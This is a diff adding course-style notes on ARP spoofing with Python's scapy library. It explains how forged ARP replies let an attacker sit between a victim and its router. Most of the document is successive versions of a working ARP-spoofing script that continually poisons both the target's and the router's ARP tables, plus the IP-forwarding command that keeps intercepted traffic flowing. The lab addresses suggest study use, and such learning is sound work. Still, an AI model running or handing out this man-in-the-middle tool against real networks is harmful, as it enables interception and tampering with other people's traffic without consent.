@@ -1,0 +1,139 @@
+ARP SPOOF
+
+scapy.ARP(<request/response>, Target IP, Target MAC, <where does the request originate from? < we say Router)
+packet = scapy.ARP(op=2, pdst="10.0.2.11",hwdst="08:00:27:e6:e5:59", <psrc>-source field of the router)
+
+when received the target will see this was send from this MAC but from the above IP address. 
+Inits ARP table it will associate the ROuter IP with the MAC address of the attacker. 
+Because on local internet hsots communicate with each other only through mac addresses. 
+PLacing attacker in the middle of the connection and everytime the victim send any request to the router it will send it to the current mac address
+
+
+
+python3 differences u have to add end="" to the print statement to print on the same line, so replace
+
+print("\r[+] Packets Sent " + str(packets_sent_count)),
+
+With
+
+print("\r[+] Sent " + str(packets_sent_count), end="")
+
+import scapy.all as scapy
+
+packet = scapy.ARP(op=2, pdst="10.0.2.11",hwdst="08:00:27:e6:e5:59", psrc="10.0.2.1")
+print(packet.show())
+print(packet.summary())
+
+scapy.send(packet)
+
+if you do arp -a to see internet adresses its acssociating the ip address of router with router MAC once we run it. It will associate its IP with the Machine MAC we want to be in the middle/kali/
+IE the desitnation machine will think the "middle machine/Kali/ is the router"
+
+STEP 2 change configuration for the router. 
+
+
+You can run the network scanner app to see the IPs in the network and 
+you can also run route -n to see the IP of the router
+run arp -a on target to see the differences on ARP table
+
+THIs will disable the internet. We need to let Kali work as a router an enabel the packets to flow through to the internet
+enable ip forwarding echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+
+
+----------------------------------------------------------------------------------------------
+
+
+#!/usr/bin/env python
+
+import scapy.all as scapy
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet)
+
+while True:
+    spoof("10.0.2.11", "10.0.2.1")
+    spoof("10.0.2.1", "10.0.2.11")
+    time.sleep(2)
+
+---------------------------------------------------------------------	
+#!/usr/bin/env python
+
+import scapy.all as scapy
+import time
+import sys
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+sent_packets_count = 0
+while True:
+    spoof("10.0.2.11", "10.0.2.1")
+    spoof("10.0.2.1", "10.0.2.11")
+    sent_packets_count = sent_packets_count +2
+    print("\r[+] Packets sent: " + str(sent_packets_count)),
+    sys.stdout.flush()
+    time.sleep(2)
+	
+----------------------------------------------------------------------------------------------------------------------------
+#!/usr/bin/env python
+
+import scapy.all as scapy
+import time
+import sys
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    print(packet.show())
+    print(packet.summary())
+
+restore("10.0.2.11", "10.0.2.1")
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof("10.0.2.11", "10.0.2.1")
+        spoof("10.0.2.1", "10.0.2.11")
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets sent: " + str(sent_packets_count)),
+        sys.stdout.flush()
+        time.sleep(2)
+except  KeyboardInterrupt:
+    print("[+] Detected CTRL + C ....Quiting.")
+-----------------------------------------------------------------------------------------------------
